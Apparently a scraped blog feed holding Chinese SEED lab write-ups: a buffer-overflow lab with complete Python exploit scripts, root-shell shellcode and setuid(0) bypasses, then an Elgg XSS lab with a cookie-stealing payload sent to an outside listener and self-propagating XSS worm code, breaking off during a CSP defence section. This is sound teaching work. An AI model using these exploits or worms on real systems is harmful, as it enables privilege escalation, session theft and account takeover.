\u0026lt;bof+42\u0026gt;:\tcall 0x5555555550c0 \u0026lt;strcpy@plt\u0026gt; [------------------------------------stack-------------------------------------] 0000| 0x7fffffffd8c0 --\u0026gt; 0x7ffff7ffd9e8 --\u0026gt; 0x7ffff7fcf000 --\u0026gt; 0x10102464c457f 0008| 0x7fffffffd8c8 --\u0026gt; 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 0016| 0x7fffffffd8d0 --\u0026gt; 0x7fffffffd964 --\u0026gt; 0x0 0024| 0x7fffffffd8d8 --\u0026gt; 0x7fffffffd9c0 --\u0026gt; 0x7fffffffddd0 --\u0026gt; 0x7fffffffe010 --\u0026gt; 0x0 0032| 0x7fffffffd8e0 --\u0026gt; 0x7ffff7fcf7f0 --\u0026gt; 0x675f646c74725f00 (\u0026#39;\u0026#39;) 0040| 0x7fffffffd8e8 --\u0026gt; 0x7ffff7fb6520 --\u0026gt; 0x7ffff7ffe190 --\u0026gt; 0x555555554000 --\u0026gt; 0x10102464c457f 0048| 0x7fffffffd8f0 --\u0026gt; 0x3 0056| 0x7fffffffd8f8 --\u0026gt; 0x7ffff7fcf4c0 --\u0026gt; 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value 20\tstrcpy(buffer, str); gdb-peda$ p $rbp $1 = (void *) 0x7fffffffd9c0 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[240]) 0x7fffffffd8d0 计算偏移：\nPython 3.8.5 (default, Jul 28 2020, 12:59:40) [GCC 9.3.0] on linux Type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; print(0x7fffffffd9c0-0x7fffffffd8d0+8) 248 因此我们需要把shellcode写到248之前，我们从100开始写，如下所示：\n# Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode 调试查看栈中数据：\n使用命令stack 400\n发现正是我们写入的shellcode和shellcode的返回地址，而且是以小端序存储的，这证明了没有被\\x00截断，成功写入了缓冲区。\n完整exp如下：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\u0026#34; \u0026#34;\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\u0026#34; \u0026#34;\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffd8d0+start # Change this number offset = 0x7fffffffd9c0-0x7fffffffd8d0+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 攻击效果：\n攻击成功，拿到root shell。\nTask6：对 64-bit 程序实施攻击 (Level 4) 本任务的缓冲区大小只有10。\n先使用gdb找到缓冲区起始地址和函数返回地址\ngdb-peda$ p $rbp $1 = (void *) 0x7fffffffd9c0 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[10]) 0x7fffffffd9b6 由于缓冲区太小，放不下我们的shellcode，于是我们可以利用main函数里的char str[517]\nint main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\u0026#34;badfile\u0026#34;, \u0026#34;r\u0026#34;); if (!badfile) { perror(\u0026#34;Opening badfile\u0026#34;); exit(1); } int length = fread(str, sizeof(char), 517, badfile); printf(\u0026#34;Input size: %d\\n\u0026#34;, length); dummy_function(str); fprintf(stdout, \u0026#34;==== Returned Properly ====\\n\u0026#34;); return 1; } 在main函数下断点，然后当str入栈时，查看shellcode的地址，如下所示：\n发现了str上的shellcode的返回地址（0x7fffffffde58+4=0x7fffffffde5c）\n于是将ret的值设为0x7fffffffde5c\n完整exp如下：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xd2\u0026#34; # xor rdx, rdx ; rdx = 0 (NULL) \u0026#34;\\x52\u0026#34; # push rdx ; push NULL (for argv/envp) \u0026#34;\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\u0026#34; # movabs rax, 0x68732f2f6e69622f ; \u0026#34;/bin//sh\u0026#34; \u0026#34;\\x50\u0026#34; # push rax ; push \u0026#34;/bin//sh\u0026#34; on the stack \u0026#34;\\x48\\x89\\xe7\u0026#34; # mov rdi, rsp ; rdi = pointer to \u0026#34;/bin//sh\u0026#34; \u0026#34;\\x52\u0026#34; # push rdx ; push NULL (argv[0] = NULL) \u0026#34;\\x57\u0026#34; # push rdi ; push \u0026#34;/bin//sh\u0026#34; address for argv[0] \u0026#34;\\x48\\x89\\xe6\u0026#34; # mov rsi, rsp ; rsi = pointer to argv \u0026#34;\\x48\\x31\\xc0\u0026#34; # xor rax, rax ; rax = 0 (clear rax) \u0026#34;\\xb0\\x3b\u0026#34; # mov al, 0x3b ; syscall number for execve (0x3b) \u0026#34;\\x0f\\x05\u0026#34; # syscall ; invoke syscall ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 108 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffde5c # Change this number #ret = 0x55555555522e offset = 0x7fffffffd9c0-0x7fffffffd9b6+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行结果：\nTask7：攻破 dash 的保护机制 设置/bin/dash 我们首先改回去，让/bin/sh指向/bin/dash：\n$ sudo ln -sf /bin/dash /bin/sh 测试shellcode 输入make setuid将call_shellcode.c编译为root所有的二进制文件，不调用setuid(0)的时候：\n可以发现由于/bin/dash的防护机制，执行shellcode后并没有进入 root shell。\n现在修改call_shellcode.c，调用setuid(0)：\n发现成功获取 root shell。\n对32bit和64bit程序实施攻击 bin/dash通过检测当前进程的euid是不是和uid相同，如果检测到不同，就会主动放弃特权，导致我们拿不到root shell，我们先使用之前32位的exp试试：\n发现确实没有拿到root shell。\n于是我们修改我们的shellcode，在前面加入以下汇编的机器码：\n; Invoke setuid(0): 32-bit\rxor ebx, ebx ; ebx = 0: setuid()\u0026#39;s argument\rxor eax, eax\rmov al, 0xd5 ; setuid()\u0026#39;s system call number\rint 0x80\r; Invoke setuid(0): 64-bit\rxor rdi, rdi ; rdi = 0: setuid()\u0026#39;s argument\rxor rax, rax\rmov al, 0x69 ; setuid()\u0026#39;s system call number\rsyscall\r// Binary code for setuid(0) // 64-bit: \u0026#34;\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x69\\x0f\\x05\u0026#34;\r// 32-bit: \u0026#34;\\x31\\xdb\\x31\\xc0\\xb0\\xd5\\xcd\\x80\u0026#34; 32bit #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xdb\\x31\\xc0\\xb0\\xd5\\xcd\\x80\u0026#34; #setuid(0) \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\u0026#34; \u0026#34;\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcb08+start # Change this number offset = 0xffffcb88-0xffffcb08+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 写入并执行，成功拿到root shell：\n64bit #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x48\\x31\\xff\\x48\\x31\\xc0\\xb0\\x69\\x0f\\x05\u0026#34; #setuid(0) \u0026#34;\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\u0026#34; \u0026#34;\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\u0026#34; \u0026#34;\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 100 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0x7fffffffd8d0+start # Change this number offset = 0x7fffffffd9c0-0x7fffffffd8d0+8 # Change this number L = 8 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) Task8：攻破地址随机化 打开地址随机化：\n$ sudo /sbin/sysctl -w kernel.randomize_va_space=2 使用sh brute-force.sh，运行暴力破解脚本，不断的运行stack-L1\n成功进入root shell。\nTask9：测试其他保护机制 打开 StackGuard 保护机制 编译时不使用-fno-stack-protector参数，重新编译stack-L1\n将以下的部分加入Makefile\nstackguard: gcc -DBUF_SIZE=$(L1) -z execstack $(FLAGS_32) -o stack-L1 stack.c gcc -DBUF_SIZE=$(L1) -z execstack $(FLAGS_32) -g -o stack-L1-dbg stack.c sudo chown root stack-L1 \u0026amp;\u0026amp; sudo chmod 4755 stack-L1 使用make stackguard进行编译：\n可以发现检测到了栈溢出，终止了程序。\n打开不可执行栈保护机制 编译时使用-z noexecstack参数，使栈上不可执行shellcode\n将以下写入makefile：\nnoexecstack: gcc -m32 -z noexecstack -o a32.out call_shellcode.c gcc -z noexecstack -o a64.out call_shellcode.c sudo chown root a32.out a64.out sudo chmod 4755 a32.out a64.out 发现程序报错，都无法提权。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C2-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/","summary":"\u003ch2 id=\"环境设置\"\u003e环境设置\u003c/h2\u003e\n\u003ch3 id=\"关闭反制措施\"\u003e关闭反制措施\u003c/h3\u003e\n\u003ch4 id=\"地址空间布局随机化\"\u003e地址空间布局随机化\u003c/h4\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e地址空间布局随机化\u003c/strong\u003e：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e使用命令\u003ccode\u003esudo sysctl -w kernel.randomize_va_space=0\u003c/code\u003e来关闭地址空间布局随机化。\u003c/p\u003e","title":"SEEDlab—缓冲区溢出漏洞"},{"content":"Task 1: 上传恶意消息以显示警告窗口 此任务的目标是在 Elgg 的个人资料中嵌入一个 JavaScript 程序，以便当其他用户查看你的个人资料时会执行 JavaScript 程序并显示一个警告窗口。\n1. 直接嵌入 以下的 JavaScript 代码将显示一个警告窗口：\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;);\u0026lt;/script\u0026gt; 下面我将使用 Alice 的账户做测试，实现显示警告窗口：\n首先登陆 Alice 的账户，用户账户如下所示： ----------------------------\rUserName | Password\r----------------------------\radmin | seedelgg\ralice | seedalice\rboby | seedboby\rcharlie | seedcharlie\rsamy | seedsamy\r---------------------------- 依次点击 Account -\u0026gt; Edit profile 进入个人资料编辑页面，在 brief description 处写入 JavaScript 代码： 保存并刷新页面，显示了警告弹窗。 2. 通过 src 属性引用嵌入 2.1 搭建一个本地 Web 服务器 创建一个目录，在目录下创建 JavaScript 脚本文件 xss_worm.js。 使用命令 python3 -m http.server 9999 启动 Web 服务。 在 /etc/hosts 文件中设置域名，将 127.0.0.1 映射到 www.miyu.com 使用 http://www.miyu.com:9999/myscripts.js 访问 JS 脚本。 2.2 使用 src 属性引用 如果你的 JavaScript 脚本过长，可以将 JavaScript 程序保存在文件中，然后使用 src 属性引用。\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://www.miyu.com:9999/myscripts.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; 访问主页，如下所示：\nTask 2：上传恶意代码以显示 Cookies 此任务的目标是在你的 Elgg 的个人资料中嵌入一个 JavaScript 程序，使得当其他用户查看你的个人资料时该用户的 cookies 将显示在警告窗口中。\n修改 Task 1 的代码，使用 document.cookie 获取当前页面的所有cookies：\n\u0026lt;script\u0026gt;alert(document.cookie);\u0026lt;/script\u0026gt; 效果如下所示：\nTask 3：窃取受害者机器的 Cookies 在前一个任务中，攻击者编写的恶意 JavaScript 代码可以打印出用户的 cookies，但只有用户可以看到 cookies，而不是攻击者。在这个任务中，攻击者希望 JavaScript 代码将用户 cookies 发送给自己。\n我们可以使用 \u0026lt;img\u0026gt; 标签实现 cookies 的发送，当 \u0026lt;img\u0026gt; 标签被插入到页面时，浏览器发出 URL 请求，利用 URL 请求，将 cookies 发送到攻击者的服务器。\n\u0026lt;script\u0026gt; document.write(\u0026#39;\u0026lt;img src=http://10.9.0.1:5555?c=\u0026#39;+ escape(document.cookie) + \u0026#39; \u0026gt;\u0026#39;); \u0026lt;/script\u0026gt; 同时，我们使用 netcat(nc) 监听 5555 端口，使用如下命令：\nnc -lknv 5555 -l 参数表示 nc 监听的是一个传入连接。 -nv 参数用于显示更详细的输入。 -k 参数表示当一个连接完成时，监听另一个连接。 实验结果如下所示：\n可以发现红框中的部分为访问者的 Cookie 信息，成功窃取到了受害者的 Cookie。\nTask 4：成为受害者的朋友 我们将编写一个 XSS 蠕虫，使得任何其他访问 Samy 页面的用户都会加 Samy 为朋友。\n1. 确定参数 在编写恶意的 JavaScript 程序之前，我们需要先搞清楚添加朋友是通过请求哪些参数来实现的，使用 FireFox 的插件 HTTP header live 可以获取发送朋友请求时的全部请求信息，我们先登陆 Samy 的账户，并对 Alice 发送好友请求，并使用 HTTP header live 插件来捕获信息。\n依次点击 Members -\u0026gt; Alice -\u0026gt; Add friend 即可添加好友，点击 Add friend 时捕获到的 GET 请求如下所示：\nhttp://www.seed-server.com/action/friends/add?friend=56\u0026amp;__elgg_ts=1730886267\u0026amp;__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ\u0026amp;__elgg_ts=1730886267\u0026amp;__elgg_token=QsFgZUqbfQ83KK3rUNkHhQ 我们发现想要完成添加好友的操作，必须获取几个参数：\nfriend 编号，可以得出 Samy 的编号为 59 __elgg_ts 参数 __elgg_token 参数 2. 编写 JavaScript 脚本 根据第一步的分析，我们可以写出如下JS脚本:\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.onload = function () { var Ajax=null; var ts=\u0026#34;\u0026amp;__elgg_ts=\u0026#34;+elgg.security.token.__elgg_ts; //（1） var token=\u0026#34;\u0026amp;__elgg_token=\u0026#34;+elgg.security.token.__elgg_token; //（2） //Construct the HTTP request to add Samy as a friend. var sendurl=\u0026#34;http://www.seed-server.com/action/friends/add?friend=59\u0026#34;+ts+token+ts+token; //FILL IN //Create and send Ajax request to add friend Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;GET\u0026#34;, sendurl, true); Ajax.send(); } \u0026lt;/script\u0026gt; 3. 攻击测试 首先登陆 Alice 的账户，确认其没有添加 Samy 的好友。 点击 Samy 的 Profile，并查看好友列表，发现自动添加了 Samy 的好友。 4. Q \u0026amp; A Q1：解释第 (1) 行和第 (2) 行的目的，为什么需要这两行？\nvar ts = \u0026quot;\u0026amp;__elgg_ts=\u0026quot; + elgg.security.token.__elgg_ts;用于获取一个时间戳（__elgg_ts）的值，可以用于防止 CSRF（跨站请求伪造）攻击，它可以确保请求是由合法用户发出的，并且请求的时间窗不会过期。\nvar token = \u0026quot;\u0026amp;__elgg_token=\u0026quot; + elgg.security.token.__elgg_token;用于获取一个 CSRF 令牌，也是为了防止 CSRF 攻击，它可以确保请求没有被篡改。\nQ2：如果 Elgg 应用程序仅为“About Me”部分提供编辑器模式，即你无法切换到文本模式，你还能成功发起攻击吗？\n不可以，因为编辑器模式会对部分符号进行转义，而且会给每一行加上 \u0026lt;p\u0026gt; 标签，并在行末加入 \u0026lt;br /\u0026gt; 换行符，使得我们的 JavaScript 脚本无法执行，如下所示：\n\u0026lt;p\u0026gt;\u0026amp;lt;script type=\u0026#34;text/javascript\u0026#34;\u0026amp;gt;\u0026lt;br /\u0026gt; window.onload = function () {\u0026lt;br /\u0026gt; \u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;var Ajax=null;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;var ts=\u0026#34;\u0026amp;amp;__elgg_ts=\u0026#34;+elgg.security.token.__elgg_ts; //（1）\u0026lt;br /\u0026gt; \u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;var token=\u0026#34;\u0026amp;amp;__elgg_token=\u0026#34;+elgg.security.token.__elgg_token; //（2）\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;//Construct the HTTP request to add Samy as a friend.\u0026lt;br /\u0026gt; \u0026amp;nbsp;\u0026amp;nbsp; \u0026amp;nbsp;var sendurl=\u0026#34;http://www.seed-server.com/action/friends/add?friend=59\u0026#34;+ts+token+ts+token; //FILL IN\u0026lt;/p\u0026gt; Task 5：修改受害者的个人资料 这个任务的目标是在受害者访问 Samy 的界面时修改受害者的个人资料。\n1. 确定参数 修改 Profile 的时候使用插件 HTTP Header Live 抓取 URL，发现修改时会发送一个 POST 请求：\n发送了一个这样的请求：\n__elgg_token=ve9v_2hFvL5So_x9hQc_xg\u0026amp;__elgg_ts=1731067312\u0026amp;name=Samy\u0026amp;description=\u0026lt;p\u0026gt;1111\u0026lt;/p\u0026gt;\u0026amp;guid=59 于是我们需要获取一下参数：\n__elgg_token: CSRF 令牌 __elgg_ts：时间戳 name：用户名 description：修改的内容 guid：用户id，samy 的 guid 为 59 2. 编写 JavaScript 脚本 根据第一步的分析，我们可以写出如下脚本：\n\u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; window.onload = function(){ //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token var userName=\u0026#34;\u0026amp;name=\u0026#34;+elgg.session.user.name; var guid=\u0026#34;\u0026amp;guid=\u0026#34;+elgg.session.user.guid; var ts=\u0026#34;\u0026amp;__elgg_ts=\u0026#34;+elgg.security.token.__elgg_ts; var token=\u0026#34;\u0026amp;__elgg_token=\u0026#34;+elgg.security.token.__elgg_token; //Construct the content of your url. var content=token+ts+userName+\u0026#34;\u0026amp;description=Your profile has been changed!!!\u0026#34;+guid; //FILL IN var samyGuid=59; //FILL IN var sendurl=\u0026#34;http://www.seed-server.com/action/profile/edit\u0026#34;; //FILL IN if(elgg.session.user.guid!=samyGuid) { //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;POST\u0026#34;, sendurl, true); Ajax.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); Ajax.send(content); } } \u0026lt;/script\u0026gt; 3. 攻击测试 登录 Alice 的账户，访问 Samy 的主页，发现 Alice 的 About me 改成了 JavaScript 脚本中设置的 Your profile has been changed!!!。\n4. Q \u0026amp; A Q3：我们为什么需要第 (1) 行？删除这行，重复你的攻击。报告并解释你的观察结果。\n这行判断用户的 guid 是否是 Samy 的 guid，如果不是，再发送 POST 请求进行攻击，这样可以防止 Samy 自己被攻击。\n如果删除第一行，samy 自己也会受到攻击，删除这行，重复攻击，如下所示：\n可以发现 Samy 的恶意脚本也被替换成了 Your profile has been changed!!!，导致无法进行下一次的攻击。\nTask 6：编写自传播 XSS 蠕虫 恶意 JavaScript 程序要成为真正的蠕虫，应该要实现自传播。也就是说，每当有人查看受感染的个人资料时，他们的个人资料不仅会被修改，蠕虫还会传播到他们的个人资料中，进一步影响查看这些新感染资料的其他人。在这个任务中，你需要实现这样一个蠕虫，它不仅修改受害者的个人资料并将用户“Samy”添加为朋友，还将蠕虫本身的副本添加到受害者的个人资料中，这样受害者就变成了攻击者。\n1. Link 方法 \u0026lt;script type=\u0026#34;text/javascript\u0026#34; src=\u0026#34;http://www.miyu.com:9999/xss_worm.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 可以使用 src 属性嵌入恶意脚本，并利用这个恶意脚本将以上这段代码传递到其他人的 Profile，这样就实现了自传播的 XSS 蠕虫。\n以下是 xss_worm.js 的实现：\nwindow.onload = function(){ //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token var userName=\u0026#34;\u0026amp;name=\u0026#34;+elgg.session.user.name; var guid=\u0026#34;\u0026amp;guid=\u0026#34;+elgg.session.user.guid; var ts=\u0026#34;\u0026amp;__elgg_ts=\u0026#34;+elgg.security.token.__elgg_ts; var token=\u0026#34;\u0026amp;__elgg_token=\u0026#34;+elgg.security.token.__elgg_token; //Construct the content of your url. var content=token+ts+userName+\u0026#34;\u0026amp;description=\u0026lt;p\u0026gt;Your profile has been changed!!!\u0026lt;\\/p\u0026gt;\u0026lt;script type=\\\u0026#34;text\\/javascript\\\u0026#34; src=\\\u0026#34;http:\\/\\/www.miyu.com:9999\\/xss_worm.js\\\u0026#34;\u0026gt;\u0026lt;\\/script\u0026gt;\u0026#34;+guid; //FILL IN var samyGuid=59; //FILL IN var sendurl1=\u0026#34;http://www.seed-server.com/action/profile/edit\u0026#34;; //change profile var sendurl2=\u0026#34;http://www.seed-server.com/action/friends/add?friend=59\u0026#34;+ts+token+ts+token; //add samy if(elgg.session.user.guid!=samyGuid) { //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;POST\u0026#34;, sendurl1, true); Ajax.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); Ajax.send(content); } Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;GET\u0026#34;, sendurl2, true); Ajax.send(); } 测试：\n登录 Alice 的账户，点击 Samy 的主页，发现 Alice 的主页被感染，同时自动加了 Samy 为好友： 登录 boby 的账户，点击 Alice 的主页，发现 Boby 的主页也被感染，也自动添加了 Samy 为好友： 这说明我们编写的这个 xss 蠕虫是自传播的，而且所有访问过 Samy 主页的人都会感染这个蠕虫并可以继续传播给别人。\n2. DOM 方法 编写 XSS 蠕虫还可以使用 DOM APIs 从网页中检索自身的副本，从而将蠕虫传播到另一个人的资料中。\n下面的 JS 代码能获取自身的副本，并显示在网页上：\n\u0026lt;script id=\u0026#34;worm\u0026#34;\u0026gt; var headerTag = \u0026#34;\u0026lt;script id=\\\u0026#34;worm\\\u0026#34; type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\u0026#34;; //(1) var jsCode = document.getElementById(\u0026#34;worm\u0026#34;).innerHTML; //(2) var tailTag = \u0026#34;\u0026lt;/\u0026#34; + \u0026#34;script\u0026gt;\u0026#34;; //(3) var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); //(4) alert(jsCode); \u0026lt;/script\u0026gt; 利用上面的机制，我们可以编写一个 xss 蠕虫：\n\u0026lt;script id=\u0026#34;worm\u0026#34;\u0026gt; window.onload = function(){ var headerTag = \u0026#34;\u0026lt;script id=\\\u0026#34;worm\\\u0026#34; type=\\\u0026#34;text/javascript\\\u0026#34;\u0026gt;\u0026#34;; // (1) var jsCode = document.getElementById(\u0026#34;worm\u0026#34;).innerHTML; // (2) var tailTag = \u0026#34;\u0026lt;/\u0026#34; + \u0026#34;script\u0026gt;\u0026#34;; // (3) var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // (4) //JavaScript code to access user name, user guid, Time Stamp __elgg_ts //and Security Token __elgg_token var userName=\u0026#34;\u0026amp;name=\u0026#34;+elgg.session.user.name; var guid=\u0026#34;\u0026amp;guid=\u0026#34;+elgg.session.user.guid; var ts=\u0026#34;\u0026amp;__elgg_ts=\u0026#34;+elgg.security.token.__elgg_ts; var token=\u0026#34;\u0026amp;__elgg_token=\u0026#34;+elgg.security.token.__elgg_token; var description=\u0026#34;\u0026amp;description=\u0026lt;p\u0026gt;Your profile has been changed!!!\u0026#34;+wormCode; //Construct the content of your url. var content=token+ts+userName+description+guid; //FILL IN var samyGuid=59; //FILL IN var sendurl1=\u0026#34;http://www.seed-server.com/action/profile/edit\u0026#34;; //change profile var sendurl2=\u0026#34;http://www.seed-server.com/action/friends/add?friend=59\u0026#34;+ts+token+ts+token; //add samy if(elgg.session.user.guid!=samyGuid) { //Create and send Ajax request to modify profile var Ajax=null; Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;POST\u0026#34;, sendurl1, true); Ajax.setRequestHeader(\u0026#34;Content-Type\u0026#34;, \u0026#34;application/x-www-form-urlencoded\u0026#34;); Ajax.send(content); } Ajax=new XMLHttpRequest(); Ajax.open(\u0026#34;GET\u0026#34;, sendurl2, true); Ajax.send(); } \u0026lt;/script\u0026gt; 测试：\n首先登陆 Alice 的账户，访问 Samy 的主页，发现 Alice 自动添加了 Samy 的好友，而且 Alice 的主页被感染。\n然后登陆 Boby 的账户，访问 Alice 的主页，发现 Boby 也自动添加了 Samy 的好友，而且 Samy 的主页被感染。\n这样就说明了这个 XSS 蠕虫是自传播的，而且使用 DOM 方法实现。\nTask 7：使用 CSP 抵御 XSS 攻击 访问以下三个URL：\nhttp://www.example32a.com http://www.example32b.com http://www.example32c.com 1. 网页前端代码分析 这三个网页的源码如下所示：\n\u0026lt;html\u0026gt; \u0026lt;h2\u0026gt;CSP Experiment\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;1. Inline: Nonce (111-111-111): \u0026lt;span id=\u0026#39;area1\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;2. Inline: Nonce (222-222-222): \u0026lt;span id=\u0026#39;area2\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;3. Inline: No Nonce: \u0026lt;span id=\u0026#39;area3\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;4. From self: \u0026lt;span id=\u0026#39;area4\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;5. From www.example60.com: \u0026lt;span id=\u0026#39;area5\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;6. From www.example70.com: \u0026lt;span id=\u0026#39;area6\u0026#39;\u0026gt;Failed\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;7. From button click: \u0026lt;button onclick=\u0026#34;alert(\u0026#39;JS Code executed!\u0026#39;)\u0026#34;\u0026gt;Click me\u0026lt;/button\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; nonce=\u0026#34;111-111-111\u0026#34;\u0026gt; document.getElementById(\u0026#39;area1\u0026#39;).innerHTML = \u0026#34;OK\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34; nonce=\u0026#34;222-222-222\u0026#34;\u0026gt; document.getElementById(\u0026#39;area2\u0026#39;).innerHTML = \u0026#34;OK\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; document.getElementById(\u0026#39;area3\u0026#39;).innerHTML = \u0026#34;OK\u0026#34;; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;script_area4.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://www.example60.com/script_area5.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;http://www.example70.com/script_area6.js\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; 这个 HTML 页面用于测试内容安全策略（Content Security Policy, CSP）分为了 7 个测试部分：\n使用 nonce=\u0026ldquo;111-111-111\u0026rdquo; 的内联 JavaScript 使用 nonce=\u0026ldquo;222-222-222\u0026rdquo; 的内联 JavaScript 没有 nonce 的内联 JavaScript 从同源加载的外部脚本 从 www.example60.com 加载的外部脚本 从 www.example70.com 加载的外部脚本 通过按钮点击触发内联 JavaScript 2. CSP 策略设置文件 在 /etc/apache2/sites-available/apache_csp.conf 文件中保存了以上三个网页的 